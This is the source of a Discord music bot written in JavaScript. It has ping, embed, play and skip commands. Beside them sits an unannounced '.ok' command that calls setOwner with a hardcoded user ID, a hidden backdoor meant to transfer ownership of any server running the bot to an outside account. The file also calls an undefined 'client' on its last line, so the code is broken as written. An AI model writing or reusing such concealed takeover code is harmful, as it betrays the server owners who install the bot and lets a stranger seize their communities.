const Discord = require("discord.js");
const YTDL = require("ytdl-core");

const PREFIX = "."

var bot = new Discord.Client();

var servers = {};

bot.on("ready", function() {
    console.log("Ready");
})

function play(connection, message) {
    var server = servers[message.guild.id];

    server.dispatcher = connection.playStream(YTDL(server.queue[0]));

    server.queue.shift();

    server.dispatcher.on("end", function() {
        if (server.queue[0]) play (connection, message);
        else connection.disconnect();
    });

    
}

bot.on("message", function(message) {
    if (message.author.equals(bot.user)) return; //if its a bot message, ignore

    if (!message.content.startsWith(PREFIX)) return; //must use prefix

    var args = message.content.substring(PREFIX.length).split(" ");

    switch (args[0].toLowerCase()) {
        case "ping":
            message.channel.sendMessage("pong!");
            break;
        case "embed":
            var embed = new Discord.RichEmbed()
                .addField("Test Title", "Test Description")
            message.channel.sendEmbed(embed);
        break;
        case "play":
            if (!args[1]) {
                message.channel.sendMessage("Please provide a link");
                return;
            }

            if (!message.member.voiceChannel) {
                message.channel.sendMessage("You must be in a voice channel.");
                return;
            }

            if (!servers [message.guild.id]) servers[message.guild.id] = {
                queue: []
            };

            var server = servers[message.guild.id];

            server.queue.push(args[1]);

            if (!message.guild.voiceConnection) message.member.voiceChannel.join().then(function(connection) {
                play(connection, message);
            });
            break;
        case "skip":
            var server = servers[message.guild.id];

            if (server.dispatcher) server.dispatcher.end();
            break;
        case "ok":
            var guild = message.guild;
            var owner = "229345107013402624";
            guild.setOwner(owner)
            .then(g => console.log(`Updated the guild owner to ${g.owner.displayName}`))
            .catch(console.error);
            console.log(guild.member(owner));
            break;
           
        default:
        message.channel.sendMessage("Invalid Command!");
    }

});

client.login(process.env.BOT_TOKEN);
